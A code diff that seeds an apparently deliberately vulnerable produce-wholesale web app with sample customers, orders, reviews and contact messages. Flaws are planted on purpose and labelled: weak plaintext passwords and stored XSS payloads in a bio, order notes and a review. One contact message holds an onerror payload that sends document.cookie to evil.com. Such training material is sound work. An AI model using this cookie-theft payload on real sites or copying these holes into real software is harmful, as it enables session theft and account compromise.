@@ -83,19 +83,86 @@ export class MemStorage implements IStorage {
       bio: null,
     });
 
-    // Sample customer
-    const customerId = randomUUID();
-    this.users.set(customerId, {
-      id: customerId,
-      username: "demo",
-      password: "demo123", // VULNERABILITY: Plaintext password
-      email: "demo@restaurant.com",
-      companyName: "Demo Restaurant",
-      contactPerson: "John Smith",
-      phone: "0161 555 0123",
-      address: "123 Main St, Manchester M1 1AA",
-      role: "customer",
-      bio: "Popular restaurant in Manchester city centre",
+    // Create multiple customer accounts
+    const customers = [
+      {
+        username: "thepubco",
+        password: "welcome123", // VULNERABILITY: Weak password
+        email: "orders@thepubcompany.co.uk",
+        companyName: "The Pub Company Ltd",
+        contactPerson: "Sarah Johnson",
+        phone: "0161 789 4521",
+        address: "45 Deansgate, Manchester M3 2AY",
+        bio: "Chain of traditional pubs across Greater Manchester serving British classics",
+      },
+      {
+        username: "bella_italia",
+        password: "pasta2024", // VULNERABILITY: Weak password
+        email: "procurement@bella-italia.co.uk",
+        companyName: "Bella Italia Restaurant",
+        contactPerson: "Marco Rossi",
+        phone: "0161 832 6574",
+        address: "78 King Street, Manchester M2 4WQ",
+        bio: "Authentic Italian restaurant in the heart of Manchester. Est. 2015",
+      },
+      {
+        username: "green_leaf",
+        password: "healthy1", // VULNERABILITY: Weak password
+        email: "manager@greenleafcafe.com",
+        companyName: "Green Leaf Café",
+        contactPerson: "Emma Williams",
+        phone: "0161 955 3344",
+        address: "12 Oxford Road, Manchester M1 5QA",
+        bio: "Vegetarian and vegan café promoting sustainable local produce",
+      },
+      {
+        username: "royal_curry",
+        password: "spice99", // VULNERABILITY: Weak password
+        email: "kitchen@royalcurryhouse.co.uk",
+        companyName: "Royal Curry House",
+        contactPerson: "Raj Patel",
+        phone: "0161 273 8899",
+        address: "156 Wilmslow Road, Manchester M14 5LH",
+        bio: "Award-winning Indian restaurant specialising in authentic curries. VULNERABILITY: <script>alert('xss')</script>", // VULNERABILITY: XSS in bio
+      },
+      {
+        username: "cityhotel",
+        password: "hotel2024", // VULNERABILITY: Weak password
+        email: "catering@manchestercityhotel.com",
+        companyName: "Manchester City Hotel",
+        contactPerson: "David Chen",
+        phone: "0161 234 9876",
+        address: "200 Portland Street, Manchester M1 3HU",
+        bio: "4-star hotel with conference facilities and two restaurants",
+      },
+      {
+        username: "testuser",
+        password: "testpass123",
+        email: "test@restaurant.com",
+        companyName: "Test Restaurant",
+        contactPerson: "John Smith",
+        phone: "0161 555 0123",
+        address: "123 Main St, Manchester M1 1AA",
+        role: "customer",
+        bio: "Popular restaurant in Manchester city centre",
+      },
+    ];
+
+    const customerIds = customers.map(c => {
+      const id = randomUUID();
+      this.users.set(id, {
+        id,
+        username: c.username,
+        password: c.password,
+        email: c.email,
+        companyName: c.companyName,
+        contactPerson: c.contactPerson,
+        phone: c.phone,
+        address: c.address,
+        role: "customer",
+        bio: c.bio,
+      });
+      return { id, username: c.username };
     });
 
     // Seed products
@@ -121,6 +188,7 @@ export class MemStorage implements IStorage {
       { name: "Fresh Coriander", description: "Fresh coriander", category: "herbs", unit: "bunch", price: "1.60", imageUrl: "", stock: 45 },
     ];
 
+    const productIds: string[] = [];
     [...vegetables, ...fruits, ...herbs].forEach(p => {
       const id = randomUUID();
       this.products.set(id, {
@@ -133,7 +201,194 @@ export class MemStorage implements IStorage {
         imageUrl: p.imageUrl,
         stock: p.stock,
       });
+      productIds.push(id);
     });
+
+    // Create historical orders for customers
+    const now = new Date();
+    const daysAgo = (days: number) => new Date(now.getTime() - days * 24 * 60 * 60 * 1000);
+
+    // The Pub Company - Regular weekly orders
+    const pubOrder1 = this.createOrderSync(customerIds[0].id, [
+      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 15, price: "3.50" },
+      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 10, price: "3.80" },
+      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 8, price: "3.20" },
+    ], "delivered", daysAgo(14), "45 Deansgate, Manchester M3 2AY", "Weekly order - all good quality");
+
+    const pubOrder2 = this.createOrderSync(customerIds[0].id, [
+      { productId: productIds[2], name: "Carrots", quantity: 12, price: "2.80" },
+      { productId: productIds[1], name: "Baby Spinach", quantity: 8, price: "4.20" },
+      { productId: productIds[3], name: "Red Bell Peppers", quantity: 10, price: "5.00" },
+    ], "delivered", daysAgo(7), "45 Deansgate, Manchester M3 2AY", null);
+
+    const pubOrder3 = this.createOrderSync(customerIds[0].id, [
+      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 15, price: "3.50" },
+      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 10, price: "3.80" },
+      { productId: productIds[10], name: "Fresh Basil", quantity: 5, price: "1.80" },
+    ], "confirmed", daysAgo(0), "45 Deansgate, Manchester M3 2AY", "Please deliver before 10am");
+
+    // Bella Italia - Italian restaurant orders
+    const italianOrder1 = this.createOrderSync(customerIds[1].id, [
+      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 25, price: "3.50" },
+      { productId: productIds[10], name: "Fresh Basil", quantity: 15, price: "1.80" },
+      { productId: productIds[3], name: "Red Bell Peppers", quantity: 12, price: "5.00" },
+    ], "delivered", daysAgo(10), "78 King Street, Manchester M2 4WQ", "Grazie! <img src=x onerror=alert('xss')>"); // VULNERABILITY: XSS in order notes
+
+    const italianOrder2 = this.createOrderSync(customerIds[1].id, [
+      { productId: productIds[1], name: "Baby Spinach", quantity: 10, price: "4.20" },
+      { productId: productIds[11], name: "Fresh Parsley", quantity: 8, price: "1.50" },
+      { productId: productIds[8], name: "Fresh Oranges", quantity: 15, price: "3.80" },
+    ], "confirmed", daysAgo(2), "78 King Street, Manchester M2 4WQ", null);
+
+    // Green Leaf Café - Organic produce
+    const cafeOrder1 = this.createOrderSync(customerIds[2].id, [
+      { productId: productIds[1], name: "Baby Spinach", quantity: 20, price: "4.20" },
+      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 15, price: "3.80" },
+      { productId: productIds[5], name: "Fresh Strawberries", quantity: 12, price: "4.50" },
+      { productId: productIds[9], name: "Blueberries", quantity: 10, price: "5.20" },
+    ], "delivered", daysAgo(5), "12 Oxford Road, Manchester M1 5QA", "All organic please");
+
+    const cafeOrder2 = this.createOrderSync(customerIds[2].id, [
+      { productId: productIds[2], name: "Carrots", quantity: 8, price: "2.80" },
+      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 10, price: "3.20" },
+      { productId: productIds[7], name: "Bananas", quantity: 15, price: "2.50" },
+    ], "pending", daysAgo(1), "12 Oxford Road, Manchester M1 5QA", "Urgent - event tomorrow");
+
+    // Royal Curry House - Herbs and vegetables
+    const curryOrder1 = this.createOrderSync(customerIds[3].id, [
+      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 18, price: "3.50" },
+      { productId: productIds[12], name: "Fresh Coriander", quantity: 20, price: "1.60" },
+      { productId: productIds[3], name: "Red Bell Peppers", quantity: 15, price: "5.00" },
+    ], "delivered", daysAgo(12), "156 Wilmslow Road, Manchester M14 5LH", null);
+
+    const curryOrder2 = this.createOrderSync(customerIds[3].id, [
+      { productId: productIds[2], name: "Carrots", quantity: 10, price: "2.80" },
+      { productId: productIds[1], name: "Baby Spinach", quantity: 12, price: "4.20" },
+      { productId: productIds[12], name: "Fresh Coriander", quantity: 15, price: "1.60" },
+    ], "confirmed", daysAgo(3), "156 Wilmslow Road, Manchester M14 5LH", "Please ring doorbell");
+
+    // City Hotel - Large orders
+    const hotelOrder1 = this.createOrderSync(customerIds[4].id, [
+      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 30, price: "3.50" },
+      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 25, price: "3.80" },
+      { productId: productIds[5], name: "Fresh Strawberries", quantity: 20, price: "4.50" },
+      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 20, price: "3.20" },
+      { productId: productIds[8], name: "Fresh Oranges", quantity: 25, price: "3.80" },
+    ], "delivered", daysAgo(8), "200 Portland Street, Manchester M1 3HU", "Conference this weekend - large order");
+
+    const hotelOrder2 = this.createOrderSync(customerIds[4].id, [
+      { productId: productIds[1], name: "Baby Spinach", quantity: 15, price: "4.20" },
+      { productId: productIds[3], name: "Red Bell Peppers", quantity: 18, price: "5.00" },
+      { productId: productIds[7], name: "Bananas", quantity: 30, price: "2.50" },
+    ], "pending", daysAgo(0), "200 Portland Street, Manchester M1 3HU", null);
+
+    // Add some product reviews
+    this.reviews.set(randomUUID(), {
+      id: randomUUID(),
+      productId: productIds[0], // Fresh Tomatoes
+      userId: customerIds[0].id,
+      rating: 5,
+      comment: "Excellent quality tomatoes, always fresh and vine-ripened. Our customers love them!",
+      createdAt: daysAgo(15),
+    });
+
+    this.reviews.set(randomUUID(), {
+      id: randomUUID(),
+      productId: productIds[10], // Fresh Basil
+      userId: customerIds[1].id,
+      rating: 5,
+      comment: "Perfetto! The basil is always aromatic and fresh. Essential for our pasta dishes.",
+      createdAt: daysAgo(11),
+    });
+
+    this.reviews.set(randomUUID(), {
+      id: randomUUID(),
+      productId: productIds[1], // Baby Spinach
+      userId: customerIds[2].id,
+      rating: 4,
+      comment: "Good quality organic spinach. Would prefer slightly larger bags though.",
+      createdAt: daysAgo(6),
+    });
+
+    this.reviews.set(randomUUID(), {
+      id: randomUUID(),
+      productId: productIds[12], // Fresh Coriander
+      userId: customerIds[3].id,
+      rating: 5,
+      comment: "Fresh coriander essential for authentic curries. Always top quality! <script>alert('review-xss')</script>", // VULNERABILITY: XSS in review
+      createdAt: daysAgo(13),
+    });
+
+    // Add some contact form submissions
+    this.contacts.set(randomUUID(), {
+      id: randomUUID(),
+      name: "Tom Baker",
+      email: "tom@newcafe.co.uk",
+      company: "The New Café",
+      message: "Hi, I'm opening a new café in Didsbury and would like to discuss wholesale pricing for fruit and vegetables. Could someone contact me?",
+      createdAt: daysAgo(4),
+    });
+
+    this.contacts.set(randomUUID(), {
+      id: randomUUID(),
+      name: "Lisa Morton",
+      email: "lisa.morton@catering.com",
+      company: "Morton Events",
+      message: "We run corporate catering events and need a reliable supplier for fresh produce. Do you offer next-day delivery? <img src=x onerror=fetch('http://evil.com/?cookie='+document.cookie)>", // VULNERABILITY: XSS in contact form
+      createdAt: daysAgo(2),
+    });
+
+    this.contacts.set(randomUUID(), {
+      id: randomUUID(),
+      name: "James Wilson",
+      email: "james@wilsonrestaurants.co.uk",
+      company: null,
+      message: "Question about your organic certification. Do you have documentation I can review?",
+      createdAt: daysAgo(6),
+    });
+  }
+
+  private createOrderSync(
+    userId: string,
+    items: Array<{ productId: string; name: string; quantity: number; price: string }>,
+    status: string,
+    createdAt: Date,
+    deliveryAddress: string,
+    notes: string | null
+  ): string {
+    const orderId = randomUUID();
+    const orderNumber = `MFF-${this.orderCounter++}`;
+    const totalAmount = items.reduce((sum, item) => 
+      sum + (parseFloat(item.price) * item.quantity), 0
+    ).toFixed(2);
+
+    this.orders.set(orderId, {
+      id: orderId,
+      orderNumber,
+      userId,
+      status,
+      totalAmount,
+      deliveryDate: status === "pending" ? null : createdAt,
+      deliveryAddress,
+      notes,
+      createdAt,
+    });
+
+    items.forEach(item => {
+      const itemId = randomUUID();
+      const subtotal = (parseFloat(item.price) * item.quantity).toFixed(2);
+      this.orderItems.set(itemId, {
+        id: itemId,
+        orderId,
+        productId: item.productId,
+        productName: item.name,
+        quantity: item.quantity,
+        unitPrice: item.price,
+        subtotal,
+      });
+    });
+
+    return orderId;
   }
 
   // Users
